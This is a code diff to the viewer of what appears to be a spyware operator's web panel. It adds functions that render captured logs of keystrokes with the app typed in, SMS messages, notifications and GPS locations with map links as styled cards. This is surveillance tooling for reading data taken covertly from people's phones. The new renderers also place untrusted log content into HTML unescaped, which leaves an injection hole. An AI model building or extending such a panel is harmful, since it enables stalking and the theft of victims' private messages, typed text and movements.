@@ -2904,7 +2904,11 @@
                     contentHtml = `<audio controls src="${url}" class="viewer-media" style="width:100%"></audio>`;
                 } else {
                     const text = new TextDecoder().decode(buffer);
-                    contentHtml = `<pre style="color:var(--primary); font-size:0.7rem; white-space:pre-wrap;">${text}</pre>`;
+                    if (isJsonOrNdjson(text)) {
+                        contentHtml = renderBeautifulJson(text);
+                    } else {
+                        contentHtml = `<pre style="color:var(--primary); font-size:0.7rem; white-space:pre-wrap;">${text}</pre>`;
+                    }
                 }
 
                 document.getElementById('status-title').innerText = `DATA_VIEWER: ${name}`;
@@ -3027,70 +3031,192 @@
             return html;
         }
 
-        function renderLogs(rawText) {
-            const lines = rawText.trim().split('\n');
-            const categories = {};
-            
-            // 1. Sort data into categories
-            lines.forEach(line => {
-                try {
-                    const obj = JSON.parse(line);
-                    const type = obj.t || "LOG";
-                    const data = obj.d || obj;
-                    if (!categories[type]) categories[type] = [];
-                    categories[type].push(data);
-                } catch (e) {}
-            });
-
-            if (Object.keys(categories).length === 0) return '<div style="text-align:center; padding:40px;">NO_PARSABLE_LOG_DATA</div>';
-
-            // 2. Render categorized tables
-            let html = "";
-            for (const [type, entries] of Object.entries(categories)) {
-                html += `<div style="margin-top:30px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
-                            <h2 style="margin:0; font-size:0.8rem; background:var(--secondary)">${type}_STREAM</h2>
-                            <span style="font-size:0.6rem; color:var(--secondary)">${entries.length} ENTRIES</span>
-                         </div>`;
-                
-                html += `<div style="overflow-x:auto; background:rgba(0,0,0,0.2); border:1px solid #222; border-left:2px solid var(--secondary);">`;
-                html += `<table style="width:100%; border-collapse:collapse; font-size:0.75rem; text-align:left;">`;
-                
-                // Header mapping based on type
-                if (type === 'SMS') {
-                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">SENDER</th><th style="padding:10px">MESSAGE</th><th style="padding:10px">TIME</th></tr>`;
-                    entries.forEach(e => {
-                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px; color:var(--primary)">${e.sender || e.num}</td><td style="padding:10px">${e.body}</td><td style="padding:10px; color:#444; white-space:nowrap">${new Date(e.timestamp || e.ts).toLocaleTimeString()}</td></tr>`;
-                    });
-                } 
-                else if (type === 'KEY') {
-                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">APP</th><th style="padding:10px">TEXT_BUFFER</th><th style="padding:10px">STATS</th></tr>`;
-                    entries.forEach(e => {
-                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px; color:var(--primary)">${e.pkg}</td><td style="padding:10px">${e.txt}</td><td style="padding:10px; color:#444">${e.wpm || 0}WPM</td></tr>`;
-                    });
+        function isJsonOrNdjson(text) {
+            const trimmed = text.trim();
+            if (!trimmed) return false;
+            if (trimmed.startsWith('{') && trimmed.endsWith('}')) return true;
+            if (trimmed.startsWith('[') && trimmed.endsWith(']')) return true;
+            const lines = trimmed.split('\n');
+            for (let i = 0; i < Math.min(lines.length, 5); i++) {
+                const line = lines[i].trim();
+                if (line) {
+                    if (line.startsWith('{') || line.startsWith('[')) {
+                        try {
+                            JSON.parse(line);
+                            return true;
+                        } catch (e) {
+                            return false;
+                        }
+                    }
+                    break;
                 }
-                else if (type === 'NOTIF') {
-                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">SOURCE</th><th style="padding:10px">CONTENT</th><th style="padding:10px">TIME</th></tr>`;
-                    entries.forEach(e => {
-                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px; color:var(--primary)">${e.pkg}</td><td style="padding:10px"><div style="font-weight:bold">${e.title}</div>${e.txt}</td><td style="padding:10px; color:#444">${new Date(e.ts).toLocaleTimeString()}</td></tr>`;
-                    });
-                }
-                else if (type === 'LOC') {
-                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">COORDINATES</th><th style="padding:10px">ACCURACY</th><th style="padding:10px">MAP_LINK</th></tr>`;
-                    entries.forEach(e => {
-                        const mapsLink = `https://www.google.com/maps?q=${e.lat},${e.lon}`;
-                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px">${e.lat.toFixed(5)}, ${e.lon.toFixed(5)}</td><td style="padding:10px">±${e.acc}m</td><td style="padding:10px"><a href="${mapsLink}" target="_blank" style="color:var(--primary)">VIEW_MAP</a></td></tr>`;
-                    });
-                }
-                else {
-                    // Generic Fallback
-                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">RAW_DATA</th></tr>`;
-                    entries.forEach(e => {
-                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px; font-family:monospace; color:#888">${JSON.stringify(e)}</td></tr>`;
-                    });
-                }
-
-                html += `</table></div>`;
             }
+            return false;
+        }
+
+        function renderBeautifulJson(text) {
+            const trimmed = text.trim();
+            try {
+                const singleObj = JSON.parse(trimmed);
+                return renderSingleJsonObject(singleObj);
+            } catch (e) {}
+
+            const lines = trimmed.split('\n');
+            let html = `<div style="display:flex; flex-direction:column; gap:12px; font-family:'Share Tech Mono', monospace; width:100%;">`;
+            lines.forEach((line, index) => {
+                const cleanLine = line.trim();
+                if (!cleanLine) return;
+                try {
+                    const item = JSON.parse(cleanLine);
+                    html += renderLogItemCard(item, index);
+                } catch (err) {
+                    html += `
+                        <div style="background:rgba(255,0,60,0.05); border:1px solid var(--danger); border-left-width:4px; padding:10px; font-size:0.7rem; color:var(--danger); word-break:break-all;">
+                            <span style="font-weight:bold; text-transform:uppercase;">[CORRUPTED_ENTRY #${index + 1}]</span><br>${cleanLine}
+                        </div>
+                    `;
+                }
+            });
+            html += `</div>`;
+            return html;
+        }
+
+        function renderSingleJsonObject(obj) {
+            if (Array.isArray(obj)) {
+                let html = `<div style="display:flex; flex-direction:column; gap:10px; font-family:'Share Tech Mono', monospace; width:100%;">`;
+                html += `<div style="font-size:0.7rem; color:var(--primary); margin-bottom:5px; text-transform:uppercase; font-weight:bold;">ARRAY ENTRIES [${obj.length}]</div>`;
+                obj.forEach((item, idx) => {
+                    html += `
+                        <div class="viewer-card" style="border-left-color: var(--secondary); padding:10px;">
+                            <div style="font-size:0.6rem; color:#555; margin-bottom:5px; font-weight:bold;">INDEX_ID: #${idx}</div>
+                            ${renderBracelessKeys(item)}
+                        </div>
+                    `;
+                });
+                html += `</div>`;
+                return html;
+            } else {
+                return `
+                    <div class="viewer-card" style="border-left-color: var(--primary); padding:15px; font-family:'Share Tech Mono', monospace; width:100%;">
+                        <div style="font-size:0.7rem; color:var(--primary); margin-bottom:10px; border-bottom:1px solid #222; padding-bottom:5px; text-transform:uppercase; font-weight:bold;">METADATA_PAYLOAD</div>
+                        ${renderBracelessKeys(obj)}
+                    </div>
+                `;
+            }
+        }
+
+        function renderLogItemCard(item, index) {
+            const type = item.t || "LOG";
+            const data = item.d || item;
+            const ts = data.ts || data.timestamp || item.ts || item.timestamp;
+            const formattedTime = ts ? new Date(ts).toLocaleString() : '';
+
+            let badgeColor = "var(--primary)";
+            if (type === 'LOC') badgeColor = "var(--success)";
+            else if (type === 'NOTIF') badgeColor = "var(--secondary)";
+            else if (type === 'KEY') badgeColor = "var(--primary)";
+            else if (type === 'SMS') badgeColor = "var(--success)";
+            else if (type === 'SCREEN') badgeColor = "#f59e0b";
+            else if (type === 'SYS') badgeColor = "var(--text)";
+
+            let bodyHtml = "";
+
+            if (type === 'LOC') {
+                const lat = data.lat || 0;
+                const lon = data.lon || 0;
+                const acc = data.acc || 0;
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                bodyHtml = `
+                    <div style="display:flex; flex-direction:column; gap:4px;">
+                        <div style="font-size:0.85rem; color:#fff;">COORDINATES: <span style="color:var(--success); font-weight:bold;">${lat.toFixed(6)}, ${lon.toFixed(6)}</span></div>
+                        <div style="font-size:0.7rem; color:#888;">ACCURACY_RADIUS: ±${Math.round(acc)}m</div>
+                        <div style="margin-top:6px;">
+                            <a href="${mapsLink}" target="_blank" class="btn" style="padding:3px 8px; font-size:0.6rem; text-decoration:none; display:inline-block; border-color:var(--success); color:var(--success);">🗺️ SATELLITE HUD VIEW</a>
+                        </div>
+                    </div>
+                `;
+            } 
+            else if (type === 'NOTIF') {
+                const pkg = data.pkg || "unknown";
+                const title = data.title || "No Title";
+                const txt = data.txt || data.body || "No Content";
+                bodyHtml = `
+                    <div style="display:flex; flex-direction:column; gap:4px;">
+                        <div style="font-size:0.7rem; color:var(--secondary); text-transform:uppercase; font-weight:bold; letter-spacing:1px;">PKG: ${pkg}</div>
+                        <div style="font-size:0.85rem; color:#fff; font-weight:bold; margin-top:2px;">${title}</div>
+                        <div style="font-size:0.8rem; color:#aaa; line-height:1.4; word-break:break-all;">${txt}</div>
+                    </div>
+                `;
+            } 
+            else if (type === 'KEY') {
+                const pkg = data.pkg || "unknown";
+                const txt = data.txt || "No Data";
+                const wpm = data.wpm ? ` | ${data.wpm} WPM` : "";
+                bodyHtml = `
+                    <div style="display:flex; flex-direction:column; gap:4px;">
+                        <div style="font-size:0.7rem; color:var(--primary); text-transform:uppercase; font-weight:bold; letter-spacing:1px;">ACTIVE APP: ${pkg}${wpm}</div>
+                        <div style="background:#050505; border:1px solid #222; padding:8px; margin-top:4px; border-left:3px solid var(--primary); font-size:0.8rem; color:#fff; word-break:break-all; font-family:monospace;">
+                            ${txt}
+                        </div>
+                    </div>
+                `;
+            } 
+            else if (type === 'SMS') {
+                const sender = data.sender || data.num || "Unknown";
+                const body = data.body || "Empty message";
+                bodyHtml = `
+                    <div style="display:flex; flex-direction:column; gap:4px;">
+                        <div style="font-size:0.75rem; color:var(--success); font-weight:bold;">SENDER: ${sender}</div>
+                        <div style="background:#050505; border:1px solid #222; padding:8px; margin-top:4px; border-left:3px solid var(--success); font-size:0.8rem; color:#fff; word-break:break-all;">
+                            ${body}
+                        </div>
+                    </div>
+                `;
+            }
+            else {
+                bodyHtml = renderBracelessKeys(data);
+            }
+
+            return `
+                <div class="viewer-card" style="border-left-color: ${badgeColor}; padding:12px; background:var(--surface); border-width: 1px 1px 1px 4px; border-style: solid; border-color: var(--surface-light) var(--surface-light) var(--surface-light) ${badgeColor}; position:relative; overflow:hidden; width:100%;">
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; border-bottom:1px solid rgba(255,255,255,0.03); padding-bottom:6px;">
+                        <span style="font-size:0.65rem; font-weight:bold; color:${badgeColor}; background:rgba(255,255,255,0.02); padding:2px 8px; border:1px solid rgba(255,255,255,0.05); text-transform:uppercase; letter-spacing:1px;">
+                            ${type}
+                        </span>
+                        ${formattedTime ? `<span style="font-size:0.6rem; color:#555;">${formattedTime}</span>` : ''}
+                    </div>
+                    ${bodyHtml}
+                </div>
+            `;
+        }
+
+        function renderBracelessKeys(obj, indent = 0) {
+            if (typeof obj !== 'object' || obj === null) {
+                return `<span style="color:#fff;">${obj}</span>`;
+            }
+
+            let html = `<div style="display:flex; flex-direction:column; gap:4px; padding-left:${indent * 10}px; width:100%;">`;
+            for (const [key, val] of Object.entries(obj)) {
+                if (indent === 0 && (key === 't' || key === 'ts' || key === 'timestamp')) continue;
+
+                const label = key.toUpperCase().replace(/_/g, ' ');
+                if (typeof val === 'object' && val !== null) {
+                    html += `
+                        <div style="margin-top:4px; width:100%;">
+                            <span style="color:var(--primary); font-size:0.7rem; font-weight:bold; letter-spacing:0.5px; text-transform:uppercase;">${label}</span>
+                            ${renderBracelessKeys(val, indent + 1)}
+                        </div>
+                    `;
+                } else {
+                    html += `
+                        <div style="display:flex; justify-content:space-between; font-size:0.75rem; border-bottom:1px dashed rgba(255,255,255,0.02); padding-bottom:2px; gap:10px; width:100%;">
+                            <span style="color:#666; font-size:0.7rem; text-transform:uppercase;">${label}:</span>
+                            <span style="color:#fff; word-break:break-all; text-align:right; max-width:70%;">${val}</span>
+                        </div>
+                    `;
+                }
+            }
+            html += `</div>`;
             return html;
         }
 
